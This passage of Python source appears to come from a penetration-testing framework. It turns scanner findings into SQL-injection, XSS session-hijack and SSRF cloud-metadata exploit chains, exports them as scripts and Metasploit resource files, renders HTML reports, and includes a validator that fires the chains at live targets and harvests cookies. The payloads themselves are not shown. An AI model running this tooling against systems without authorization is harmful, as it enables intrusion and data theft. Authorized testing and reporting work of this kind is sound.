        for event in attack_chain.events:
            vuln_types.add(event.finding_type.lower())

        # Match to chain builders
        if 'sql_injection' in vuln_types or 'sqli' in vuln_types:
            if 'authentication_bypass' in vuln_types or 'auth_bypass' in vuln_types:
                return self._build_sqli_auth_chain_from_events(attack_chain.events)
            else:
                return self._build_sqli_extraction_chain_from_events(attack_chain.events)

        if 'xss' in vuln_types or 'cross_site_scripting' in vuln_types:
            return self._build_xss_chain_from_events(attack_chain.events)

        if 'ssrf' in vuln_types:
            return self._build_ssrf_chain_from_events(attack_chain.events)

        # Generic chain for unmatched patterns
        return self._build_generic_chain(attack_chain)

    def _build_sqli_auth_chain_from_events(
        self,
        events: List[CorrelatedEvent]
    ) -> Optional[PoCChain]:
        """Build SQLi auth bypass chain from events"""
        # Find the vulnerable endpoint
        for event in events:
            url = event.url
            evidence = event.evidence

            # Try to extract endpoint info
            parsed = urlparse(url)
            endpoint = parsed.path

            # Check for login indicators
            if any(kw in endpoint.lower() for kw in ['login', 'auth', 'signin', 'dologin']):
                return ChainBuilder.build_sqli_auth_bypass_chain(
                    target_url=f"{parsed.scheme}://{parsed.netloc}",
                    login_endpoint=endpoint,
                    username_param=evidence.get('parameter', 'username'),
                    password_param=evidence.get('password_param', 'password'),
                )

        return None

    def _build_sqli_extraction_chain_from_events(
        self,
        events: List[CorrelatedEvent]
    ) -> Optional[PoCChain]:
        """Build SQLi data extraction chain from events"""
        for event in events:
            url = event.url
            evidence = event.evidence

            parsed = urlparse(url)
            endpoint = parsed.path
            param = evidence.get('parameter', 'id')

            return ChainBuilder.build_sqli_data_extraction_chain(
                target_url=f"{parsed.scheme}://{parsed.netloc}",
                vulnerable_endpoint=endpoint,
                vulnerable_param=param,
            )

        return None

    def _build_xss_chain_from_events(
        self,
        events: List[CorrelatedEvent]
    ) -> Optional[PoCChain]:
        """Build XSS chain from events"""
        for event in events:
            url = event.url
            evidence = event.evidence

            parsed = urlparse(url)
            endpoint = parsed.path
            param = evidence.get('parameter', 'q')

            return ChainBuilder.build_xss_session_hijack_chain(
                target_url=f"{parsed.scheme}://{parsed.netloc}",
                vulnerable_endpoint=endpoint,
                vulnerable_param=param,
            )

        return None

    def _build_ssrf_chain_from_events(
        self,
        events: List[CorrelatedEvent]
    ) -> Optional[PoCChain]:
        """Build SSRF chain from events"""
        for event in events:
            url = event.url
            evidence = event.evidence

            parsed = urlparse(url)
            endpoint = parsed.path
            param = evidence.get('parameter', 'url')

            return ChainBuilder.build_ssrf_cloud_metadata_chain(
                target_url=f"{parsed.scheme}://{parsed.netloc}",
                vulnerable_endpoint=endpoint,
                vulnerable_param=param,
            )

        return None

    def _build_generic_chain(self, attack_chain: AttackChain) -> PoCChain:
        """Build generic PoC chain for unmatched patterns"""
        vuln_types = list(set(e.finding_type for e in attack_chain.events))

        chain = PoCChain(
            id=attack_chain.id,
            name=attack_chain.name,
            description=attack_chain.description,
            target=self.target,
            vulnerability_types=vuln_types,
            cvss_score=attack_chain.risk_score,
            impact_summary=attack_chain.attack_narrative,
        )

        for i, event in enumerate(attack_chain.events, 1):
            step = PoCStep(
                step_number=i,
                title=event.finding_type,
                description=f"Exploit {event.finding_type} vulnerability",
                method="GET",
                url=event.url,
            )
            step.curl_command = PoCGenerator.generate_curl(step)
            step.python_code = PoCGenerator.generate_python(step)
            step.raw_http = PoCGenerator.generate_raw_http(step)
            chain.steps.append(step)

        chain.full_python_script = ChainBuilder._generate_full_python_script(chain)
        chain.full_curl_script = ChainBuilder._generate_full_curl_script(chain)
        chain.markdown_report = ChainBuilder._generate_markdown_report(chain)

        return chain

    def _build_chain_from_event(self, event: CorrelatedEvent) -> Optional[PoCChain]:
        """Build a simple PoC chain from a single high-value event"""
        vuln_type = event.finding_type.lower()
        parsed = urlparse(event.url)
        param = event.evidence.get('parameter', 'id')

        base_url = f"{parsed.scheme}://{parsed.netloc}"
        endpoint = parsed.path

        if 'sql' in vuln_type or 'sqli' in vuln_type:
            return ChainBuilder.build_sqli_data_extraction_chain(
                base_url, endpoint, param
            )
        elif 'xss' in vuln_type:
            return ChainBuilder.build_xss_session_hijack_chain(
                base_url, endpoint, param
            )
        elif 'ssrf' in vuln_type:
            return ChainBuilder.build_ssrf_cloud_metadata_chain(
                base_url, endpoint, param
            )

        return None

    def generate_full_report(self) -> str:
        """Generate comprehensive report with all PoC chains"""
        lines = [
            "# ReconX PoC Chain Analysis Report",
            "",
            f"**Target:** `{self.target}`",
            f"**Generated:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"**Total Chains:** {len(self.chains)}",
            "",
            "---",
            "",
            "## Executive Summary",
            "",
        ]

        # Summary stats
        critical = sum(1 for c in self.chains if c.cvss_score >= 9)
        high = sum(1 for c in self.chains if 7 <= c.cvss_score < 9)
        medium = sum(1 for c in self.chains if 4 <= c.cvss_score < 7)

        lines.extend([
            f"- **Critical Severity Chains:** {critical}",
            f"- **High Severity Chains:** {high}",
            f"- **Medium Severity Chains:** {medium}",
            "",
            "---",
            "",
        ])

        # Individual chain reports
        for i, chain in enumerate(self.chains, 1):
            lines.append(f"## Chain {i}: {chain.name}")
            lines.append("")
            lines.append(chain.markdown_report)
            lines.append("")
            lines.append("---")
            lines.append("")

        return "\n".join(lines)

    def export_all_scripts(self) -> Dict[str, str]:
        """Export all generated scripts, including Metasploit resource files"""
        scripts = {}

        # Import msfconsole integration for .rc file generation
        try:
            from beatrix.core.external_tools import MetasploitRunner
            msf = MetasploitRunner()
            msf_available = msf.available
        except Exception:
            msf = None
            msf_available = False

        for chain in self.chains:
            safe_name = re.sub(r'[^a-zA-Z0-9]', '_', chain.name.lower())
            scripts[f"{safe_name}.py"] = chain.full_python_script
            scripts[f"{safe_name}.sh"] = chain.full_curl_script
            scripts[f"{safe_name}.yaml"] = chain.nuclei_template
            scripts[f"{safe_name}.md"] = chain.markdown_report

            # Generate Metasploit .rc resource file if msfconsole is available
            if msf_available and msf and chain.steps:
                # Determine finding type from chain name
                chain_lower = chain.name.lower()
                finding_type = None
                for ftype in ["sqli", "rce", "ssti", "deserialization", "xxe", "file_upload"]:
                    if ftype in chain_lower:
                        finding_type = ftype
                        break
                if not finding_type and "injection" in chain_lower:
                    finding_type = "sqli" if "sql" in chain_lower else "rce"

                rc_content = None
                if finding_type:
                    rc_content = msf.generate_exploit_rc(
                        finding_type=finding_type,
                        target=chain.steps[0].url,
                        evidence={"chain": chain.name},
                    )

                # Fallback: dynamically search Metasploit modules if no
                # hardcoded mapping matched and msfconsole is available
                if not rc_content and msf.available:
                    import asyncio
                    # Extract a useful search keyword from the chain name
                    search_terms = [w for w in chain_lower.replace("-", " ").replace("_", " ").split()
                                    if len(w) > 3 and w not in ("the", "for", "with", "from", "that", "this")]
                    for term in search_terms[:2]:
                        try:
                            modules = asyncio.get_event_loop().run_until_complete(
                                msf.search_modules(term)
                            ) if not asyncio.get_event_loop().is_running() else []
                            if modules:
                                from urllib.parse import urlparse as _urlparse
                                _parsed = _urlparse(chain.steps[0].url if "://" in chain.steps[0].url
                                                    else f"https://{chain.steps[0].url}")
                                _host = _parsed.hostname or chain.steps[0].url
                                _port = _parsed.port or (443 if _parsed.scheme == "https" else 80)
                                rc_content = msf.generate_resource_file(
                                    exploit_module=modules[0],
                                    target_host=_host,
                                    target_port=_port,
                                    use_ssl=_parsed.scheme == "https",
                                )
                                break
                        except Exception:
                            pass

                if rc_content:
                    scripts[f"{safe_name}.rc"] = rc_content

        return scripts


# =============================================================================
# HTML SECTION GENERATOR FOR VALIDATED POC CHAINS
# =============================================================================

def generate_poc_chain_section_html(chains: List[PoCChain], validated_results: Optional[Dict] = None) -> str:
    """
    Generate a detailed HTML section for PoC chains to embed in reports.

    This creates a Cyber Kill Chain-style visual representation of each
    validated exploitation chain with step-by-step reproduction instructions.

    Args:
        chains: List of PoCChain objects
        validated_results: Optional dict of chain_id -> validation status

    Returns:
        HTML string for the PoC chains section
    """
    if not chains:
        return """
        <section class="section poc-chains-section">
            <h2>🔓 Proof-of-Concept Exploit Chains</h2>
            <p style="color: var(--text-secondary); text-align: center; padding: 2rem;">
                No PoC chains generated. Run correlation engine with vulnerability findings first.
            </p>
        </section>
        """

    validated_results = validated_results or {}

    # CSS for PoC chains section
    css = """
    <style>
    .poc-chains-section {
        margin-top: 2rem;
    }

    .poc-chain-card {
        background: var(--card-bg, #1a1a2e);
        border-radius: 12px;
        margin-bottom: 2rem;
        overflow: hidden;
        border: 1px solid var(--border-color, #2a2a4a);
        transition: transform 0.2s, box-shadow 0.2s;
    }

    .poc-chain-card:hover {
        transform: translateY(-2px);
        box-shadow: 0 8px 25px rgba(0,0,0,0.3);
    }

    .poc-chain-card.validated {
        border-left: 4px solid #00ff88;
    }

    .poc-chain-card.unvalidated {
        border-left: 4px solid #ffa500;
    }

    .poc-chain-header {
        padding: 1.5rem;
        background: linear-gradient(135deg, rgba(255,0,100,0.1), rgba(0,100,255,0.1));
        border-bottom: 1px solid var(--border-color, #2a2a4a);
    }

    .poc-chain-header h3 {
        margin: 0 0 0.5rem 0;
        display: flex;
        align-items: center;
        gap: 0.75rem;
    }

    .validation-badge {
        display: inline-flex;
        align-items: center;
        gap: 0.25rem;
        padding: 0.25rem 0.75rem;
        border-radius: 20px;
        font-size: 0.75rem;
        font-weight: 600;
    }

    .validation-badge.validated {
        background: rgba(0, 255, 136, 0.2);
        color: #00ff88;
    }

    .validation-badge.pending {
        background: rgba(255, 165, 0, 0.2);
        color: #ffa500;
    }

    .poc-meta {
        display: flex;
        flex-wrap: wrap;
        gap: 1rem;
        margin-top: 0.75rem;
    }

    .poc-meta-item {
        display: flex;
        align-items: center;
        gap: 0.5rem;
        font-size: 0.85rem;
        color: var(--text-secondary, #888);
    }

    .cvss-badge {
        padding: 0.25rem 0.5rem;
        border-radius: 4px;
        font-weight: 700;
        font-size: 0.85rem;
    }

    .cvss-badge.critical { background: rgba(255,0,0,0.2); color: #ff4444; }
    .cvss-badge.high { background: rgba(255,100,0,0.2); color: #ff6600; }
    .cvss-badge.medium { background: rgba(255,200,0,0.2); color: #ffaa00; }
    .cvss-badge.low { background: rgba(0,200,0,0.2); color: #00cc00; }

    .poc-chain-body {
        padding: 1.5rem;
    }

    .chain-description {
        color: var(--text-secondary, #aaa);
        margin-bottom: 1.5rem;
        line-height: 1.6;
    }

    /* Kill Chain Style Flow Visualization */
    .exploitation-flow {
        display: flex;
        align-items: stretch;
        gap: 0;
        margin: 1.5rem 0;
        overflow-x: auto;
        padding: 1rem 0;
    }

    .flow-step {
        flex: 1;
        min-width: 150px;
        position: relative;
        text-align: center;
    }

    .flow-step::after {
        content: '';
        position: absolute;
        top: 35px;
        right: -15px;
        width: 30px;
        height: 2px;
        background: linear-gradient(90deg, #00ff88, #00aaff);
        z-index: 1;
    }

    .flow-step:last-child::after {
        display: none;
    }

    .step-icon {
        width: 70px;
        height: 70px;
        border-radius: 50%;
        background: linear-gradient(135deg, var(--step-color-1, #ff0066), var(--step-color-2, #6600ff));
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 0.75rem;
        font-size: 1.5rem;
        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    }

    .step-number {
        position: absolute;
        top: -5px;
        left: 50%;
        transform: translateX(-50%);
        background: #00ff88;
        color: #000;
        width: 24px;
        height: 24px;
        border-radius: 50%;
        font-size: 0.75rem;
        font-weight: 700;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .step-title {
        font-weight: 600;
        font-size: 0.9rem;
        margin-bottom: 0.25rem;
    }

    .step-method {
        font-size: 0.75rem;
        color: var(--text-secondary, #888);
    }

    /* Step Details Accordion */
    .step-details {
        margin-top: 2rem;
    }

    .step-detail-card {
        background: rgba(0,0,0,0.2);
        border-radius: 8px;
        margin-bottom: 1rem;
        overflow: hidden;
    }

    .step-detail-header {
        padding: 1rem;
        background: rgba(255,255,255,0.05);
        display: flex;
        align-items: center;
        gap: 1rem;
        cursor: pointer;
    }

    .step-detail-header:hover {
        background: rgba(255,255,255,0.08);
    }

    .step-num-badge {
        background: linear-gradient(135deg, #ff0066, #6600ff);
        width: 28px;
        height: 28px;
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: 700;
        font-size: 0.85rem;
    }

    .step-detail-content {
        padding: 1rem;
    }

    .http-block {
        background: #0d0d1a;
        border-radius: 6px;
        padding: 1rem;
        font-family: 'Monaco', 'Menlo', 'Consolas', monospace;
        font-size: 0.8rem;
        overflow-x: auto;
        margin: 0.75rem 0;
    }

    .http-method { color: #ff6b6b; font-weight: 700; }
    .http-url { color: #4ecdc4; }
    .http-header-name { color: #ffd93d; }
    .http-header-value { color: #95e1d3; }
    .http-body { color: #ff9ff3; }

    /* Code Blocks */
    .code-block {
        background: #0d0d1a;
        border-radius: 6px;
        overflow: hidden;
        margin: 1rem 0;
    }

    .code-header {
        background: rgba(255,255,255,0.1);
        padding: 0.5rem 1rem;
        display: flex;
        justify-content: space-between;
        align-items: center;
        font-size: 0.8rem;
    }

    .code-lang {
        color: #00ff88;
        font-weight: 600;
    }

    .copy-btn {
        background: rgba(255,255,255,0.1);
        border: none;
        color: #fff;
        padding: 0.25rem 0.75rem;
        border-radius: 4px;
        cursor: pointer;
        font-size: 0.75rem;
    }

    .copy-btn:hover {
        background: rgba(255,255,255,0.2);
    }

    .code-content {
        padding: 1rem;
        font-family: 'Monaco', 'Menlo', 'Consolas', monospace;
        font-size: 0.8rem;
        overflow-x: auto;
        white-space: pre;
        line-height: 1.5;
    }

    /* Impact Section */
    .impact-section {
        background: rgba(255,0,0,0.1);
        border-left: 3px solid #ff4444;
        padding: 1rem;
        border-radius: 0 8px 8px 0;
        margin-top: 1.5rem;
    }

    .impact-title {
        color: #ff4444;
        font-weight: 600;
        margin-bottom: 0.5rem;
    }

    /* Tabs for code variants */
    .poc-tabs {
        display: flex;
        gap: 0.5rem;
        margin-bottom: 1rem;
    }

    .poc-tab {
        padding: 0.5rem 1rem;
        background: rgba(255,255,255,0.05);
        border: none;
        color: var(--text-secondary, #888);
        border-radius: 6px;
        cursor: pointer;
        font-size: 0.85rem;
    }

    .poc-tab.active {
        background: linear-gradient(135deg, #ff0066, #6600ff);
        color: #fff;
    }

    .poc-tab-content {
        display: none;
    }

    .poc-tab-content.active {
        display: block;
    }

    /* Summary Stats */
    .poc-summary-stats {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
        gap: 1rem;
        margin-bottom: 2rem;
    }

    .poc-stat-card {
        background: rgba(255,255,255,0.05);
        border-radius: 10px;
        padding: 1.25rem;
        text-align: center;
    }

    .poc-stat-value {
        font-size: 2rem;
        font-weight: 700;
        background: linear-gradient(135deg, #ff0066, #00aaff);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-clip: text;
    }

    .poc-stat-label {
        color: var(--text-secondary, #888);
        font-size: 0.85rem;
        margin-top: 0.25rem;
    }
    </style>
    """

    # Calculate stats
    total_chains = len(chains)
    validated_count = sum(1 for c in chains if validated_results.get(c.id, False))
    critical_count = sum(1 for c in chains if c.cvss_score >= 9)
    high_count = sum(1 for c in chains if 7 <= c.cvss_score < 9)
    total_steps = sum(len(c.steps) for c in chains)

    # Generate summary stats HTML
    stats_html = f"""
    <div class="poc-summary-stats">
        <div class="poc-stat-card">
            <div class="poc-stat-value">{total_chains}</div>
            <div class="poc-stat-label">PoC Chains</div>
        </div>
        <div class="poc-stat-card">
            <div class="poc-stat-value">{validated_count}</div>
            <div class="poc-stat-label">Validated</div>
        </div>
        <div class="poc-stat-card">
            <div class="poc-stat-value">{critical_count}</div>
            <div class="poc-stat-label">Critical Severity</div>
        </div>
        <div class="poc-stat-card">
            <div class="poc-stat-value">{total_steps}</div>
            <div class="poc-stat-label">Total Steps</div>
        </div>
    </div>
    """

    # Generate chain cards
    chain_cards_html = []

    step_icons = {
        1: "🎯",  # Initial access
        2: "🔓",  # Exploitation
        3: "📤",  # Data extraction
        4: "💀",  # Impact
    }

    for chain in chains:
        is_validated = validated_results.get(chain.id, False)

        # Determine CVSS severity class
        if chain.cvss_score >= 9:
            cvss_class = "critical"
        elif chain.cvss_score >= 7:
            cvss_class = "high"
        elif chain.cvss_score >= 4:
            cvss_class = "medium"
        else:
            cvss_class = "low"

        # Generate exploitation flow visualization
        flow_steps_html = []
        for i, step in enumerate(chain.steps[:4], 1):  # Show up to 4 steps
            icon = step_icons.get(i, "⚡")
            flow_steps_html.append(f"""
                <div class="flow-step">
                    <div class="step-number">{i}</div>
                    <div class="step-icon">{icon}</div>
                    <div class="step-title">{html.escape(step.title[:25])}{'...' if len(step.title) > 25 else ''}</div>
                    <div class="step-method">{step.method} Request</div>
                </div>
            """)

        # Generate detailed step cards
        step_details_html = []
        for step in chain.steps:
            # Format HTTP request preview
            headers_html = ""
            if step.headers:
                for name, value in list(step.headers.items())[:5]:
                    headers_html += f'<span class="http-header-name">{html.escape(name)}</span>: <span class="http-header-value">{html.escape(value)}</span>\\n'

            curl_escaped = html.escape(step.curl_command) if step.curl_command else "# No curl command generated"

            step_details_html.append(f"""
                <div class="step-detail-card">
                    <div class="step-detail-header">
                        <div class="step-num-badge">{step.step_number}</div>
                        <div>
                            <strong>{html.escape(step.title)}</strong>
                            <div style="font-size: 0.8rem; color: var(--text-secondary);">
                                {html.escape(step.description[:100])}{'...' if len(step.description) > 100 else ''}
                            </div>
                        </div>
                    </div>
                    <div class="step-detail-content">
                        <div class="http-block">
<span class="http-method">{step.method}</span> <span class="http-url">{html.escape(step.url)}</span> HTTP/1.1
{headers_html}
{f'<span class="http-body">{html.escape(step.body[:200] if step.body else "")}</span>' if step.body else ''}
                        </div>

                        <div class="code-block">
                            <div class="code-header">
                                <span class="code-lang">curl</span>
                                <button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.nextElementSibling.textContent)">Copy</button>
                            </div>
                            <div class="code-content">{curl_escaped}</div>
                        </div>

                        <div style="margin-top: 0.75rem;">
                            <strong>Success Indicators:</strong>
                            <ul style="margin: 0.5rem 0; color: var(--text-secondary);">
                                {''.join(f'<li style="font-size: 0.85rem;">{html.escape(ind)}</li>' for ind in step.success_indicators[:3]) or '<li style="font-size: 0.85rem;">Check HTTP response status</li>'}
                            </ul>
                        </div>
                    </div>
                </div>
            """)

        # Generate Python script preview (first 30 lines)
        python_preview = chain.full_python_script.split('\n')[:30]
        python_preview_escaped = html.escape('\n'.join(python_preview))

        # Full curl script
        curl_script_escaped = html.escape(chain.full_curl_script or "# No curl script generated")

        chain_cards_html.append(f"""
            <div class="poc-chain-card {'validated' if is_validated else 'unvalidated'}">
                <div class="poc-chain-header">
                    <h3>
                        {html.escape(chain.name)}
                        <span class="validation-badge {'validated' if is_validated else 'pending'}">
                            {'✓ Validated' if is_validated else '○ Pending Validation'}
                        </span>
                    </h3>
                    <div class="poc-meta">
                        <div class="poc-meta-item">
                            <span class="cvss-badge {cvss_class}">CVSS {chain.cvss_score:.1f}</span>
                        </div>
                        <div class="poc-meta-item">
                            📌 {', '.join(chain.vulnerability_types[:3])}
                        </div>
                        <div class="poc-meta-item">
                            🔗 {len(chain.steps)} Steps
                        </div>
                        {f'<div class="poc-meta-item">⏱️ {chain.cwe_ids[0]}</div>' if chain.cwe_ids else ''}
                    </div>
                </div>

                <div class="poc-chain-body">
                    <p class="chain-description">{html.escape(chain.description)}</p>

                    <h4 style="margin-bottom: 1rem;">📊 Exploitation Flow</h4>
                    <div class="exploitation-flow">
                        {''.join(flow_steps_html)}
                    </div>

                    <h4 style="margin: 1.5rem 0 1rem;">📋 Step-by-Step Reproduction</h4>
                    <div class="step-details">
                        {''.join(step_details_html)}
                    </div>

                    <h4 style="margin: 1.5rem 0 1rem;">💻 Full Exploit Scripts</h4>
                    <div class="poc-tabs">
                        <button class="poc-tab active" onclick="showPocTab(this, 'python-{chain.id}')">Python</button>
                        <button class="poc-tab" onclick="showPocTab(this, 'bash-{chain.id}')">Bash/Curl</button>
                    </div>

                    <div id="python-{chain.id}" class="poc-tab-content active">
                        <div class="code-block">
                            <div class="code-header">
                                <span class="code-lang">Python 3</span>
                                <button class="copy-btn" onclick="copyFullScript('{chain.id}', 'python')">Copy Full Script</button>
                            </div>
                            <div class="code-content" id="python-code-{chain.id}">{python_preview_escaped}

# ... (truncated for display - copy for full script)</div>
                        </div>
                    </div>

                    <div id="bash-{chain.id}" class="poc-tab-content">
                        <div class="code-block">
                            <div class="code-header">
                                <span class="code-lang">Bash</span>
                                <button class="copy-btn" onclick="copyFullScript('{chain.id}', 'bash')">Copy Full Script</button>
                            </div>
                            <div class="code-content" id="bash-code-{chain.id}">{curl_script_escaped}</div>
                        </div>
                    </div>

                    <div class="impact-section">
                        <div class="impact-title">⚠️ Business Impact</div>
                        <p style="margin: 0; color: var(--text-secondary);">
                            {html.escape(chain.business_impact or chain.impact_summary or 'Exploitation of this chain could lead to unauthorized access, data theft, or system compromise.')}
                        </p>
                    </div>
                </div>
            </div>
        """)

    # JavaScript for tabs
    js = """
    <script>
    function showPocTab(btn, tabId) {
        // Deactivate all tabs in this card
        const card = btn.closest('.poc-chain-card');
        card.querySelectorAll('.poc-tab').forEach(t => t.classList.remove('active'));
        card.querySelectorAll('.poc-tab-content').forEach(c => c.classList.remove('active'));

        // Activate clicked tab
        btn.classList.add('active');
        document.getElementById(tabId).classList.add('active');
    }

    // Full script storage (would be populated from JSON in real implementation)
    const fullScripts = {};

    function copyFullScript(chainId, type) {
        const codeEl = document.getElementById(type + '-code-' + chainId);
        if (codeEl) {
            navigator.clipboard.writeText(codeEl.textContent);
            alert('Script copied to clipboard!');
        }
    }
    </script>
    """

    return f"""
    {css}
    <section class="section poc-chains-section">
        <h2>🔓 Proof-of-Concept Exploit Chains</h2>
        <p style="color: var(--text-secondary); margin-bottom: 1.5rem;">
            Actionable exploitation chains with working code to reproduce vulnerabilities.
            Each chain represents a complete attack path from initial access to impact.
        </p>

        {stats_html}

        {''.join(chain_cards_html)}
    </section>
    {js}
    """


# =============================================================================
# CHAIN VALIDATION ENGINE
# =============================================================================

class PoCValidator:
    """
    Validates PoC chains by executing requests and checking responses.

    WARNING: This should only be used against authorized targets!
    """

    def __init__(self, timeout: int = 10, verify_ssl: bool = False):
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.session = None
        self.results: Dict[str, Dict] = {}

    def _get_session(self):
        """Get or create requests session"""
        if self.session is None:
            try:
                import requests
                import urllib3
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                self.session = requests.Session()
            except ImportError:
                raise RuntimeError("requests library required for validation")
        return self.session

    def validate_chain(self, chain: PoCChain, verbose: bool = True) -> Dict:
        """
        Validate a single PoC chain by executing its steps.

        Args:
            chain: PoCChain to validate
            verbose: Print progress

        Returns:
            Dict with validation results
        """
        import requests

        session = self._get_session()

        result = {
            'chain_id': chain.id,
            'chain_name': chain.name,
            'validated': False,
            'steps': [],
            'error': None,
            'validation_time': None,
        }

        start_time = datetime.now()

        if verbose:
            print(f"\n[*] Validating: {chain.name}")
            print(f"    Target: {chain.target}")
            print("-" * 50)

        extracted_values = {}  # For chaining between steps

        try:
            for step in chain.steps:
                step_result = {
                    'step_number': step.step_number,
                    'title': step.title,
                    'validated': False,
                    'status_code': None,
                    'success_indicators_found': [],
                    'extracted_values': {},
                }

                if verbose:
                    print(f"\n  [Step {step.step_number}] {step.title}")
                    print(f"    {step.method} {step.url}")

                # Prepare request
                url = step.url
                headers = dict(step.headers)
                body = step.body

                # Substitute extracted values
                for key, value in extracted_values.items():
                    url = url.replace(f"{{{key}}}", value)
                    if body:
                        body = body.replace(f"{{{key}}}", value)
                    for h_name, h_value in headers.items():
                        headers[h_name] = h_value.replace(f"{{{key}}}", value)

                # Execute request
                try:
                    if step.method.upper() == "GET":
                        resp = session.get(url, headers=headers, timeout=self.timeout,
                                          verify=self.verify_ssl, allow_redirects=False)
                    elif step.method.upper() == "POST":
                        resp = session.post(url, headers=headers, data=body,
                                           timeout=self.timeout, verify=self.verify_ssl,
                                           allow_redirects=False)
                    else:
                        resp = session.request(step.method, url, headers=headers, data=body,
                                              timeout=self.timeout, verify=self.verify_ssl,
                                              allow_redirects=False)

                    step_result['status_code'] = resp.status_code

                    if verbose:
                        print(f"    Status: {resp.status_code}")

                    # Check expected status
                    status_ok = resp.status_code in step.expected_status

                    # Check success indicators
                    response_text = resp.text.lower()
                    indicators_found = []
                    for indicator in step.success_indicators:
                        if indicator.lower() in response_text or indicator.lower() in str(resp.headers).lower():
                            indicators_found.append(indicator)

                    step_result['success_indicators_found'] = indicators_found

                    if verbose and indicators_found:
                        print(f"    ✓ Found: {', '.join(indicators_found[:3])}")

                    # Check failure indicators
                    has_failure = any(f.lower() in response_text for f in step.failure_indicators)

                    # Determine step validation
                    if status_ok and len(indicators_found) > 0 and not has_failure:
                        step_result['validated'] = True
                        if verbose:
                            print("    ✅ Step validated!")
                    elif status_ok:
                        step_result['validated'] = True
                        if verbose:
                            print("    ✅ Step passed (status OK)")

                    # Extract values for chaining
                    for name, pattern in step.extract_from_response.items():
                        match = re.search(pattern, resp.text)
                        if match:
                            extracted_values[name] = match.group(1)
                            step_result['extracted_values'][name] = match.group(1)
                            if verbose:
                                print(f"    Extracted {name}: {match.group(1)[:30]}...")

                    # Also extract cookies
                    if resp.cookies:
                        for cookie_name, cookie_value in resp.cookies.items():
                            extracted_values[f"cookie_{cookie_name}"] = cookie_value
                            session.cookies.set(cookie_name, cookie_value)

                except requests.RequestException as e:
                    step_result['error'] = str(e)
                    if verbose:
                        print(f"    ❌ Request failed: {e}")

                result['steps'].append(step_result)

            # Determine overall chain validation
            validated_steps = sum(1 for s in result['steps'] if s['validated'])
            result['validated'] = validated_steps >= len(chain.steps) * 0.5  # At least 50% steps pass

            if verbose:
                print(f"\n{'='*50}")
                print(f"Chain Result: {'✅ VALIDATED' if result['validated'] else '❌ NOT VALIDATED'}")
                print(f"Steps Passed: {validated_steps}/{len(chain.steps)}")

        except Exception as e:
            result['error'] = str(e)
            if verbose:
                print(f"\n❌ Validation error: {e}")

        result['validation_time'] = (datetime.now() - start_time).total_seconds()

        self.results[chain.id] = result
        return result

    def validate_all(self, chains: List[PoCChain], verbose: bool = True) -> Dict[str, Dict]:
        """Validate all chains"""
        if verbose:
            print(f"\n{'='*60}")
            print("POC CHAIN VALIDATION")
            print(f"{'='*60}")
            print(f"Chains to validate: {len(chains)}")

        for chain in chains:
            self.validate_chain(chain, verbose)

        if verbose:
            validated_count = sum(1 for r in self.results.values() if r['validated'])
            print(f"\n{'='*60}")
            print("VALIDATION SUMMARY")
            print(f"{'='*60}")
            print(f"Validated: {validated_count}/{len(chains)}")
            for chain_id, r in self.results.items():
                status = "✅" if r['validated'] else "❌"
                print(f"  {status} {r['chain_name']}")

        return self.results

    def get_validated_chain_ids(self) -> List[str]:
        """Get list of validated chain IDs"""
        return [chain_id for chain_id, r in self.results.items() if r['validated']]


# =============================================================================
# CONVENIENCE FUNCTIONS
# =============================================================================

def generate_poc_chains(
    target: str,
    correlation_engine: EventCorrelationEngine
) -> Tuple[PoCChainEngine, List[PoCChain]]:
    """
    Convenience function to generate PoC chains from correlation results.

    Args:
        target: Target URL
        correlation_engine: Configured EventCorrelationEngine

    Returns:
        Tuple of (engine, chains)
    """
    engine = PoCChainEngine(target)
    chains = engine.process_correlation_results(correlation_engine)
    return engine, chains


def quick_sqli_auth_poc(
    target: str,
    login_endpoint: str = "/login",
    username_param: str = "username",
    password_param: str = "password"
) -> PoCChain:
    """Quick helper to generate SQLi auth bypass PoC"""
    return ChainBuilder.build_sqli_auth_bypass_chain(
        target, login_endpoint, username_param, password_param
    )


def quick_ssrf_poc(
    target: str,
    vulnerable_endpoint: str,
    url_param: str = "url"
) -> PoCChain:
    """Quick helper to generate SSRF PoC"""
    return ChainBuilder.build_ssrf_cloud_metadata_chain(
        target, vulnerable_endpoint, url_param
    )


# =============================================================================
# EXPORT
# =============================================================================

__all__ = [
    # Types
    'PoCLanguage',
    'ExploitationType',
    'PoCStep',
    'PoCChain',

    # Generators
    'PayloadLibrary',
    'PoCGenerator',
    'ChainBuilder',

    # Engine
    'PoCChainEngine',

    # Validation
    'PoCValidator',

    # HTML Generation
    'generate_poc_chain_section_html',

    # Convenience
    'generate_poc_chains',
    'quick_sqli_auth_poc',
    'quick_ssrf_poc',
]
